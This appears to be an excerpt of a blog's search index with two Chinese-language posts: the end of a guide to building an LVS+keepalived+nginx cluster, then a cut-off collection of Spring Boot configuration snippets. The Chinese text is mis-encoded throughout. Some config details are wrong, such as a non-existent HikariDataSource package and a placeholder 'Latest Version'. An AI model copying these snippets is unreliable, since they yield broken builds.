auto;</span><br><span class="line"><span class="comment"># pid /run/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">  <span class="attribute">worker_connections</span> <span class="number">786</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿™é‡Œæ˜¯ç›´æ¥è¿”å›200çŠ¶æ€ç å’Œä¸€æ®µæ–‡æœ¬</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">      <span class="attribute">default_type</span> text/html;</span><br><span class="line">      <span class="attribute">return</span> <span class="number">200</span> <span class="string">&quot;Hello, Nginx! Server zhangxufeng@172.16.28.132\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"><span class="comment"># pid /run/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">  <span class="attribute">worker_connections</span> <span class="number">786</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿™é‡Œæ˜¯ç›´æ¥è¿”å›200çŠ¶æ€ç å’Œä¸€æ®µæ–‡æœ¬</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">      <span class="attribute">default_type</span> text/html;</span><br><span class="line">      <span class="attribute">return</span> <span class="number">200</span> <span class="string">&quot;Hello, Nginx! Server zhangxufeng@172.16.28.133\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸¤å°æœºå™¨è¿”å›çš„æ–‡æœ¬ä¸­ä¸»æœº ip æ˜¯ä¸ä¸€æ ·çš„ã€‚nginx é…ç½®å®Œæˆåï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå¯åŠ¨ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo nginx</span></span><br></pre></td></tr></table></figure><p>åœ¨å¯åŠ¨ nginx ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦é…ç½®è™šæ‹Ÿ ipï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„ lvs è°ƒåº¦å™¨æ˜¯ DR æ¨¡å¼ï¼Œå‰é¢æˆ‘ä»¬è®²åˆ°è¿‡ï¼Œè¿™ç§æ¨¡å¼ä¸‹ï¼Œå¯¹å®¢æˆ·ç«¯çš„å“åº”æ˜¯çœŸå®æœåŠ¡å™¨ç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯çš„ï¼Œè€ŒçœŸå®æœåŠ¡å™¨éœ€è¦å°†å“åº”æŠ¥æ–‡ä¸­çš„æº ip ä¿®æ”¹ä¸ºè™šæ‹Ÿ ipï¼Œè¿™é‡Œé…ç½®çš„è™šæ‹Ÿ ip å°±æ˜¯èµ·è¿™ä¸ªä½œç”¨çš„ã€‚æˆ‘ä»¬ç¼–è¾‘<code>/etc/init.d/lvsrs</code>æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">ifconfig lo:<span class="number">0</span> <span class="number">172.16</span>.<span class="number">28.120</span> netmask <span class="number">255.255</span>.<span class="number">255.255</span> broadcast <span class="number">172.16</span>.<span class="number">28.120</span> up</span><br><span class="line">route add -host <span class="number">172.16</span>.<span class="number">28.120</span> dev lo:<span class="number">0</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;0&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4/ip_forward</span><br><span class="line">echo <span class="string">&quot;1&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>lo/arp_ignore</span><br><span class="line">echo <span class="string">&quot;2&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>lo/arp_announce</span><br><span class="line">echo <span class="string">&quot;1&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>all/arp_ignore</span><br><span class="line">echo <span class="string">&quot;2&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>all/arp_announce</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>  loï¼šè¡¨ç¤ºå½“å‰ä¸»æœºçœŸå®ç½‘å¡çš„åç§°ï¼›</li><li>  172.16.28.120ï¼šè¡¨ç¤ºè™šæ‹Ÿ ipï¼›</li></ul><p>ç¼–å†™å®Œæˆåè¿è¡Œè¯¥è„šæœ¬æ–‡ä»¶å³å¯ã€‚ç„¶åå°†ä¸¤å° lvs+keepalived æœºå™¨ä¸Šçš„ keepalived æœåŠ¡å¯åŠ¨èµ·æ¥å³å¯ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service keepalived <span class="literal">start</span></span><br></pre></td></tr></table></figure><p>æœ€åå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹é…ç½®çš„ lvs+keepalived çš„ç­–ç•¥ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[zhangxufeng@localhost keepalived]$ sudo ipvsadm -ln<span class="built_in"></span></span><br><span class="line"><span class="built_in">IP </span>Virtual<span class="built_in"> Server </span>version 1.2.1 (<span class="attribute">size</span>=4096)</span><br><span class="line">Prot LocalAddress:Port<span class="built_in"> Scheduler </span>Flags</span><br><span class="line">  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConn</span><br><span class="line">TCP  172.16.28.120:80 rr</span><br><span class="line">  -&gt; 172.16.28.132:80            <span class="built_in"> Route </span>  1      0          0</span><br></pre></td></tr></table></figure><h4 id="é›†ç¾¤æµ‹è¯•"><a href="#é›†ç¾¤æµ‹è¯•" class="headerlink" title="é›†ç¾¤æµ‹è¯•"></a>é›†ç¾¤æµ‹è¯•</h4><p>æ ¹æ®ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬é…ç½®å®Œæˆäº†ä¸€ä¸ª lvs+keepalived+nginx çš„é›†ç¾¤ã€‚åœ¨æµè§ˆå™¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®<code>http://172.16.28.120</code>å³å¯çœ‹åˆ°å¦‚ä¸‹å“åº”ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, Nginx! Server <span class="symbol">zhangxufeng@</span><span class="number">172.16</span><span class="number">.28</span><span class="number">.132</span></span><br></pre></td></tr></table></figure><p>å¤šæ¬¡åˆ·æ–°æµè§ˆå™¨ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æµè§ˆå™¨ä¸­æ˜¾ç¤ºçš„æ–‡æœ¬åˆ‡æ¢å¦‚ä¸‹ï¼Œè¿™æ˜¯å› ä¸º lvs çš„è´Ÿè½½å‡è¡¡ç­–ç•¥äº§ç”Ÿçš„ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, Nginx! Server <span class="symbol">zhangxufeng@</span><span class="number">172.16</span><span class="number">.28</span><span class="number">.133</span></span><br></pre></td></tr></table></figure><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>æœ¬æ–‡é¦–å…ˆå¯¹ lvs å’Œ keepalived çš„å·¥ä½œåŸç†è¿›è¡Œäº†è®²è§£ï¼Œåˆ†åˆ«ä»‹ç»äº†å…¶å·¥ä½œçš„å‡ ç§æ¨¡å¼ï¼Œç„¶åå¯¹ lvs+keepalived+nginx æ­å»º nginx é›†ç¾¤çš„æ–¹å¼è¿›è¡Œè¯¦ç»†è®²è§£ï¼Œå¹¶ä¸”è¯´æ˜äº†å…¶ä¸­æ‰€éœ€è¦æ³¨æ„çš„é—®é¢˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootå¸¸ç”¨é…ç½®æ•´åˆ</title>
      <link href="post/33451/"/>
      <url>post/33451/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>SpringBootå¸¸ç”¨é…ç½®æ•´åˆï¼Œæ–¹ä¾¿å‚è€ƒ</p><span id="more"></span><h3 id="SpringBoot-èµ·æ­¥"><a href="#SpringBoot-èµ·æ­¥" class="headerlink" title="SpringBoot èµ·æ­¥"></a>SpringBoot èµ·æ­¥</h3><h4 id="å¼•å…¥ä¾èµ–-parent"><a href="#å¼•å…¥ä¾èµ–-parent" class="headerlink" title="å¼•å…¥ä¾èµ– parent"></a>å¼•å…¥ä¾èµ– parent</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®èµ„æºå±æ€§"><a href="#è®¾ç½®èµ„æºå±æ€§" class="headerlink" title="è®¾ç½®èµ„æºå±æ€§"></a>è®¾ç½®èµ„æºå±æ€§</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceCoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceCoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¼•å…¥ä¾èµ–-dependency"><a href="#å¼•å…¥ä¾èµ–-dependency" class="headerlink" title="å¼•å…¥ä¾èµ– dependency"></a>å¼•å…¥ä¾èµ– dependency</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MyBatis-Plus-æ•´åˆ"><a href="#MyBatis-Plus-æ•´åˆ" class="headerlink" title="MyBatis Plus æ•´åˆ"></a>MyBatis Plus æ•´åˆ</h3><h4 id="æ·»åŠ æ•°æ®æºå’Œä¾èµ–"><a href="#æ·»åŠ æ•°æ®æºå’Œä¾èµ–" class="headerlink" title="æ·»åŠ æ•°æ®æºå’Œä¾èµ–"></a>æ·»åŠ æ•°æ®æºå’Œä¾èµ–</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mysqlé©±åŠ¨ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.41<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- mybatis plus --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>Latest Version<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="åœ¨ymlä¸­æ·»åŠ é…ç½®"><a href="#åœ¨ymlä¸­æ·»åŠ é…ç½®" class="headerlink" title="åœ¨ymlä¸­æ·»åŠ é…ç½®"></a>åœ¨ymlä¸­æ·»åŠ é…ç½®</h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># é…ç½®æ•°æ®æºä¿¡æ¯</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span>                                     <span class="comment"># æ•°æ®æºçš„ç›¸å…³é…ç½®</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.jw.hikari.HikariDataSource</span>          <span class="comment"># æ•°æ®æºç±»å‹ï¼ŒHikariCP</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span>      <span class="comment"># mysql é©±åŠ¨</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/shop?useUnicode=true&amp;characterEncoding=UTF-8&amp;autoReconnect&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># MyBatis Plus é…ç½®</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.jw.pojo</span>           <span class="comment"># æ‰€æœ‰ POJO ç±»æ‰€åœ¨åŒ…è·¯å¾„</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">logic-delete-value:</span> <span class="string">UNIX_TIMESTAMP()</span>   <span class="comment"># é€»è¾‘å·²åˆ é™¤å€¼</span></span><br><span class="line">      <span class="attr">logic-not-delete-value:</span> <span class="number">0</span>              <span class="comment"># é€»è¾‘æœªåˆ é™¤å€¼</span></span><br></pre></td></tr></table></figure><h3 id="HikariCP-è¿æ¥æ± "><a href="#HikariCP-è¿æ¥æ± " class="headerlink" title="HikariCP è¿æ¥æ± "></a>HikariCP è¿æ¥æ± </h3><h4 id="åœ¨ymlä¸­æ·»åŠ é…ç½®-1"><a href="#åœ¨ymlä¸­æ·»åŠ é…ç½®-1" class="headerlink" title="åœ¨ymlä¸­æ·»åŠ é…ç½®"></a>åœ¨ymlä¸­æ·»åŠ é…ç½®</h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">connection-timeout:</span> <span class="number">30000</span>     <span class="comment"># ç­‰å¾…è¿æ¥æ± åˆ†é…è¿æ¥çš„æœ€å¤§æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰ï¼Œè¶…è¿‡æ—¶é•¿è¿˜æ— è¿æ¥åˆ™å‘ç”Ÿ SQLExceptionï¼Œé»˜è®¤ï¼š30ç§’</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">5</span>               <span class="comment"># æœ€å°è¿æ¥æ•°</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">20</span>         <span class="comment"># æœ€å¤§è¿æ¥æ•°</span></span><br><span class="line">      <span class="attr">auto-commit:</span> <span class="literal">true</span>             <span class="comment"># è‡ªåŠ¨æäº¤</span></span><br><span class="line">      <span class="attr">idle-timeout:</span> <span class="number">600000</span>          <span class="comment"># è¿æ¥è¶…æ—¶çš„æœ€å¤§æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰ï¼Œè¶…æ—¶åˆ™è¢«é‡Šæ”¾ï¼ˆretiredï¼‰ï¼Œé»˜è®¤ï¼š10åˆ†é’Ÿ</span></span><br><span class="line">      <span class="attr">pool-name:</span> <span class="string">DataSourceHikariCP</span> <span class="comment"># è¿æ¥æ± åç§°</span></span><br><span class="line">      <span class="attr">max-lifetime:</span> <span class="number">1800000</span>         <span class="comment"># è¿æ¥çš„ç”Ÿå‘½æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰è¶…æ—¶è€Œæ²¡æœ‰è¢«ä½¿ç”¨åˆ™é‡Šæ”¾ï¼ˆretiredï¼‰ï¼Œé»˜è®¤ï¼š30åˆ†é’Ÿ</span></span><br><span class="line">      <span class="attr">connection-test-query:</span> <span class="string">SELECT</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Swagger2-æ–‡æ¡£"><a href="#Swagger2-æ–‡æ¡£" class="headerlink" title="Swagger2 æ–‡æ¡£"></a>Swagger2 æ–‡æ¡£</h3><h4 id="æ·»åŠ ä¾èµ–"><a href="#æ·»åŠ ä¾èµ–" class="headerlink" title="æ·»åŠ ä¾èµ–"></a>æ·»åŠ ä¾èµ–</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.github.xiaoymin/swagger-bootstrap-ui --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="SpringBoot-æ—¥å¿—"><a href="#SpringBoot-æ—¥å¿—" class="headerlink" title="SpringBoot æ—¥å¿—"></a>SpringBoot æ—¥å¿—</h3><h4 id="ç§»é™¤é»˜è®¤æ—¥å¿—"><a href="#ç§»é™¤é»˜è®¤æ—¥å¿—" class="headerlink" title="ç§»é™¤é»˜è®¤æ—¥å¿—"></a>ç§»é™¤é»˜è®¤æ—¥å¿—</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ æ—¥å¿—æ¡†æ¶ä¾èµ–"><a href="#æ·»åŠ æ—¥å¿—æ¡†æ¶ä¾èµ–" class="headerlink" title="æ·»åŠ æ—¥å¿—æ¡†æ¶ä¾èµ–"></a>æ·»åŠ æ—¥å¿—æ¡†æ¶ä¾èµ–</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/slf4j-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/slf4j-log4j12 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 